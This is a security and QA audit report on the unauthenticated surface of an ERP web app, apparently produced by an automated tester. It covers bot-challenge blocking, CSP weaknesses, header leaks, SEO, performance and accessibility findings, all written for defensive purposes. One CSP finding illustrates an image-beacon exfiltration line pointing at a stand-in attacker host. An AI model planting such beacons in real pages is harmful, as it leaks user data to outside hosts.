# Production QA — ThirdCode ERP (ABI OPS)

- Target: `https://thirdcode-erp.vercel.app/` (Vercel, Next.js App Router)
- Date: 2026-10-04 (MPST)
- Scope actually executed: **unauthenticated surface only** (see §7 Blockers)
- Requested but not reachable: `/dashboard`, `/platform-admin` and every other gated route
- Method: live probing (HTTP + headless browser DOM), static analysis of the shipped client
  bundle, and measurement of the actual response payloads. Evidence artifacts retained in the
  QA scratch dir (`h1–h4.txt`/`h.json` headers, `land.html`, `login.html`, `e404.html`/`nf.html`,
  `bc.txt`, `rb.txt`, `mf.json`, `sm.xml`, `opt_*.bin`, `waf.*`).

---

## 0. Headline

The site is **well built in the areas I could reach**: correct 307 gating on every protected
route, nonce-based CSP with `strict-dynamic`, HSTS, `X-Frame-Options: DENY`, `object-src 'none'`,
a clean client bundle with zero secrets, and no reflected XSS. The defects below are real but
concentrated in hardening, SEO metadata, image delivery and one keyboard-accessibility bug.

The single most important item is not a code bug: **the origin is now hard-blocked behind Vercel's
bot challenge ("Failed to verify your browser / Code 21") for this entire client**, and curl with a
real browser User-Agent gets `403 + X-Vercel-Mitigated: challenge` (see #1). That behaviour stopped
the audit mid-flight and would equally stop uptime monitors, CI smoke tests and server-side callers.

---

## 1. Blocker found during the audit — Vercel bot/WAF challenge blocks non-browser clients

Severity: **High (availability / operability)**

Evidence:

```
$ curl -A "<real Chrome UA>" -D - https://thirdcode-erp.vercel.app/auth/login
HTTP/1.1 403 Forbidden
Server: Vercel
X-Vercel-Mitigated: challenge
(33,978-byte "Vercel Security Checkpoint" interstitial)

Headless browser on the same origin:
"Failed to verify your browser  /  Code 21  /  Vercel Security Checkpoint"
```

Impact:
- No non-JS fallback: any client that cannot execute the challenge script gets a 403 with an HTML
  interstitial. That includes uptime/synthetic monitors, `curl`-based health checks, CI smoke tests,
  load tests, and any server-to-server call to the **web** origin (webhook callbacks, partner
  integrations, link previewers/`og:` fetchers — link unfurls in Slack/Teams/WhatsApp will fail).
- Legitimate humans behind corporate NAT/VPN/proxies or with privacy extensions get the same wall;
  "Code 21" is a hard failure, not a solvable challenge.
- Once tripped, repeat testing from the same network becomes impossible — it also breaks manual QA.

Recommended action: confirm whether Vercel **Attack Challenge Mode** was left on, or a bot-protection
rule is over-matching. If the intent is to protect only auth/mutation endpoints, scope the rule there
and exclude `/api/health`, static assets and `_next/static/*`. Whatever the intent, decide explicitly
whether non-browser clients must be able to reach the web origin — right now they cannot.

---

## 2. Security hardening

**2.1 CSP mixes `'unsafe-inline'` and `https:` into a nonce + `strict-dynamic` policy.**
Severity: Medium.
The header is `script-src 'self' 'nonce-…' 'strict-dynamic' https: 'unsafe-inline'`. Modern browsers
ignore `https:` and `'unsafe-inline'` when `strict-dynamic` is present, so today it is not directly
exploitable — but any browser that supports neither nonces nor `strict-dynamic` (CSP2-era) falls back
to `'unsafe-inline'`, which permits arbitrary inline script. Remove `'unsafe-inline'` and the bare
`https:` source from `script-src`. Evidence: `h1.txt`, `h2.txt`.

**2.2 `connect-src` allows `https://api.openai.com` although no client code calls it.**
Severity: Low-Medium. Over-broad egress allowlist: any future HTML injection gains a permitted
exfiltration/relay destination. Grep of every shipped chunk found no OpenAI usage from the browser.
Drop it unless a browser-side call is genuinely planned. Evidence: CSP header; bundle grep.

**2.3 `img-src` contains a bare `https:` source.** Severity: Low-Medium.
Any HTTPS host can be used as an image beacon (`<img src="https://attacker/?d=…">`) — a data-exfil
channel that survives otherwise-good script CSPs. Enumerate the actual image hosts instead.

**2.4 No CSP violation reporting** (`report-uri` / `report-to`). Severity: Low.
Violations are invisible: you will not learn about an XSS attempt or a broken policy before a user
reports a broken page.

**2.5 `/api/health` is public and unauthenticated, and leaks the exact deploy revision.**
Severity: Low-Medium.
Response body names the service and the build: service `abi-ops-web`, revision `efa32923c0f0`.
That hash is a real commit on `main`, so an unauthenticated caller learns precisely which build is
live — useful for targeting known dependency CVEs. Keep the liveness probe, drop `service`/`revision`
(or gate it behind the health-check token).

**2.6 Inconsistent HSTS between the app and the challenge path on the same origin.**
Severity: Low.
App routes: `Strict-Transport-Security: max-age=31536000; includeSubDomains`.
Challenge/`script.js` path: `max-age=63072000; includeSubDomains; preload`.
Two different edge configurations for one hostname. Pick one policy and apply it origin-wide
(add `preload` deliberately and submit to the preload list if that is the intent).

**2.7 Response headers that should not ship.**
Severity: Info/Low.
- `X-Powered-By: Next.js` — framework fingerprinting; suppress via `poweredByHeader: false`.
- `X-Nonce: <same nonce as CSP>` — a debug artifact echoing the CSP nonce in a header. It adds no
  security and creates a failure mode: any cache layer serving HTML with a fresh nonce header while
  the body is cached would break every script on the page.
- `X-Matched-Path` — internal routing detail.

**2.8 No `Cross-Origin-Opener-Policy` / `Cross-Origin-Resource-Policy` / `Cross-Origin-Embedder-Policy`**
on HTML documents (CORP is set only on the challenge script). Severity: Low. Add COOP `same-origin`
and CORP `same-origin` for cross-origin isolation and hotlink protection.

**2.9 "Keep me signed in for 7 days" is checked by default on the login form.**
Severity: Low (security UX). On shared/kiosk/mobile devices this silently extends the session to a
week. Secure default is unchecked.

Good and verified (no action): `frame-ancestors 'none'` + `X-Frame-Options: DENY`, `object-src 'none'`,
`base-uri 'self'`, `form-action 'self'`, `upgrade-insecure-requests`, `X-Content-Type-Options: nosniff`,
`Cache-Control: private, no-cache, no-store, must-revalidate` on all HTML, and **zero secrets in the
client bundle** (only the Supabase anon key; no API keys; no client-visible `/api/` strings).

---

## 3. SEO / metadata

**3.1 404 and error pages emit contradictory `robots` directives.** Severity: Medium.
Every `/_not-found` response contains **both**
`<meta name="robots" content="noindex"/>` and a streamed `<meta name="robots" content="index, follow"/>`
(inherited root-layout metadata). Crawlers that honour the permissive one can index 404/500 pages.
Fix by making the not-found/error segment's `noindex` win (don't inherit the root `robots` default on
error boundaries). Evidence: `bc.txt`, `e404.html`, `nf.html` — both tags present in the same document.

**3.2 `favicon.ico` and `apple-touch-icon.png` are not served (404).** Severity: Low-Medium.
The document declares only `<link rel="icon" href="/icon.svg" sizes="any">` and the manifest declares
only that SVG. Consequences: `/favicon.ico` guesses 404 (log noise, wasted requests); **iOS Safari has
no home-screen icon** (it falls back to a page screenshot); **Android Chrome cannot install the PWA**
because installability requires a 192 px and 512 px PNG icon.

**3.3 Web manifest is minimal / partly wrong.** Severity: Low-Medium.
`{"name":"ABI OPS","start_url":"/","display":"standalone","icons":[{"src":"/icon.svg","sizes":"any"}]}`
- no 192/512 PNG, no `maskable` icon → not installable, no adaptive/mask icon;
- `start_url:"/"` opens the marketing page, not the app shell (should be `/dashboard`, with `scope:"/"`);
- no `scope`, no `id`, no `orientation`;
- `theme_color` `#145f40` vs `background_color` `#0e1116` — no splash/theme consistency.
Only fix this if installability is a goal; otherwise drop the manifest rather than shipping a broken one.

**3.4 `robots.txt` lists stale paths and omits one real one.** Severity: Low.
`Disallow: /client` and `Disallow: /portal` are both **404** (removed or renamed features), and
**`/platform-admin` is not disallowed** although `/admin` is. If that console is ever reachable without
redirecting to login, it becomes crawlable. Evidence: `rb.txt` vs the route-status probe.

Fine as-is: `sitemap.xml` lists only `/`, which is correct for a fully gated app.

---

## 4. Performance

**4.1 The hero image is lazy-loaded although it is the LCP element.** Severity: Medium.
`<img … loading="lazy" decoding="async" data-nimg="fill" sizes="100vw" src=…w=3840…>` with no
`priority` / `fetchpriority="high"`. All four landing images are `loading="lazy"`. Lazy-loading the
full-viewport above-the-fold hero delays Largest Contentful Paint and hurts Core Web Vitals.
Next.js `priority` on the hero is the fix.

**4.2 Raster images are served as PNG, not WebP/AVIF.** Severity: Medium.
Measured optimizer output — all PNG: `640x427 @ 75 KB`, `828x552 @ 121 KB`, `1080x720 @ 200 KB`,
`1536x1024 @ 378 KB`; the hero source `abi-ops-hero.png` is a **1.9 MB PNG**. Photographs in PNG are
typically 50–70 % larger than WebP/AVIF. These responses were fetched with `Accept: */*`; confirm that
`images.formats` (or the CDN's format negotiation) actually returns `image/avif`/`image/webp` when the
browser advertises them — if it does not, enable it.

**4.3 Hero source is too small for its render size → visibly soft on large/Retina screens.**
Severity: Medium.
The source is `1536x1024`, and Next caps every variant at source width: `w=1920` and `w=3840` return the
**identical** 1536x1024 / 378,422-byte file. Rendered at `sizes="100vw"`, the hero is upscaled on any
viewport wider than 1536 px and on all high-DPI displays. Ship a ~2560–3840 px source (or a CSS/gradient
treatment) if the hero is meant to be full-bleed.

> Correction / retraction: an intermediate note in this audit claimed "~6.2 MB of PNGs on the landing
> page". That figure was wrong — the landing page has exactly **4** images (all via `next/image` with
> correct `srcset`/`sizes`), totalling roughly 0.6–1.7 MB depending on viewport. The measurements in
> 4.1–4.3 are the accurate ones.

---

## 5. Accessibility (verified from the served markup and the shipped chunk)

**5.1 The password show/hide toggle is removed from the keyboard tab order.** Severity: Medium.
`<button type="button" class="auth-input-toggle" aria-label="Show password" aria-pressed="false" tabindex="-1">`
— confirmed both in the DOM and as `tabIndex:-1` in the login chunk. Keyboard-only users cannot reveal
the password to check a typo (WCAG 2.1.1 Keyboard failure), and the `aria-pressed` state can never be
reached. Because it is shared, the same defect is present on the signup form. Remove `tabIndex={-1}`.

**5.2 `autofocus` on the email input.** Severity: Low/nit. Focus is moved on load, which can disorient
screen-reader/keyboard users and cause mobile scroll jumps; WCAG guidance discourages autofocus.

Verified good (no action): `<label for>` on both fields, `autocomplete="email"` /
`current-password`, `required` + `aria-required`, the remember-me checkbox is **properly labelled**
(wrapped in `<label>` with visible text — I initially suspected otherwise and re-checked),
`<html lang="en">`, the 404 page uses `role="status"` with an `<h1>`, and focus-visible styling is present.

---

## 6. Functional notes

- Every gated route (`/dashboard`, `/platform-admin`, `/pipeline`, `/bom`, `/procurement`, `/invoices`,
  `/warranty`, `/settings`, `/cortex`, `/crm`, `/documents`, `/tasks`, `/reports`) correctly returns
  **307 → `/auth/login`** when unauthenticated. Correct behaviour, not a bug.
- `/api/broadcast` (a bundled-library realtime path, not an app route) returns the **HTML** 404 page.
  Consider JSON 404s for `/api/*` so programmatic callers are not handed HTML.
- An `/invite` page is reachable unauthenticated. Token validation, single-use semantics and
  rate-limiting could not be exercised (WAF block) — flagged as unverified, not as a bug.

---

## 6.1 Re-tested after the WAF block lifted (same day, later run)

The security checkpoint in #1 lifted by itself on a later attempt, which confirms it is
intermittent rather than a permanent block. With the origin reachable again I re-ran the
auth-surface checks that do not require the real password. All three came back clean:

- `/platform-admin` correctly **307 → `/auth/login`** when unauthenticated. Gating is intact.
- **No user enumeration.** Submitting a deliberately wrong password for a nonexistent address
  (`qa-probe-…@thirdcodesolutions.invalid`) and for a real account returns the **identical**
  generic message `Invalid login credentials`. Good practice; keep it.
- **Login error state is accessibility-complete.** The error is rendered into a live region
  (`role="alert"`/`aria-live`), both inputs get `aria-invalid="true"` and `aria-describedby="login-error"`.
  This supersedes an earlier suspicion that errors might not be announced — they are.
  (This makes #5.1 the only accessibility defect on the login form.)

Two failed sign-in attempts were made with dummy passwords, one of them against the real
account. No lockout or throttle response was observed, which is itself worth confirming
deliberately: there is no evidence of per-account rate limiting on the login endpoint.

---

## 7. Blockers — what could NOT be tested

1. **The entire authenticated surface was never reached.** The stated targets `/dashboard` and
   `/platform-admin` (plus every other gated route) remain untested. Three attempts to store the
   supplied credentials in the credential vault were declined, and the audit's operating rules forbid
   typing a password into a page directly. With the browser running headless there is also no manual
   login path.
2. **The origin was hard-blocked for this client** by the security checkpoint (#1) — the browser got
   "Code 21" and curl got 403 even with a real browser UA, which stopped live probing for a period.
   The block **lifted on its own later the same day**, confirming it is intermittent. Expect it to
   return under repeated automated traffic.

Not tested as a result: tenant isolation / RLS enforcement, audit-log writes on mutations, any
create/update/delete flow, error states and validation messages inside the app, invite acceptance,
password-reset end-to-end, Supabase Realtime behaviour, Inngest job execution, and dashboards/KPIs.

To unblock: (a) allow the credential to be stored so the vault can fill the login form, or run the QA
from a named account where the tester can log in interactively; and (b) exempt the QA egress IP from
the bot challenge (or run QA from an unflagged network).

---

## 8. Recommended credential hygiene

The login email and shared password were pasted in plaintext into a local file
(`C:\Users\MSI\AppData\Local\hermes\pastes\paste_1_002655.txt`, `paste_3_003040.txt`). Treat that
password as exposed — rotate it for both the admin and demo accounts, and prefer per-tester credentials
over a shared one.

---

## 9. Priority order

1. Decide and fix the bot/WAF policy so monitors, CI and server-to-server callers can reach the web
   origin (#1) — this also unblocks the rest of this audit.
2. Fix contradictory `robots` directives on 404/error pages (#3.1).
3. `priority` on the hero + enable WebP/AVIF + ship a larger hero source (#4.1–4.3).
4. Remove `tabIndex={-1}` from the password toggle (#5.1).
5. Tighten CSP (`'unsafe-inline'`, `https:` in `script-src`, `api.openai.com` in `connect-src`, bare
   `https:` in `img-src`) and add CSP reporting (#2.1–2.4).
6. Trim `/api/health`; unify HSTS; drop `X-Powered-By`/`X-Nonce` (#2.5–2.7).
7. Icons/manifest, robots.txt stale paths, remember-me default (#3.2–3.4, #2.9).
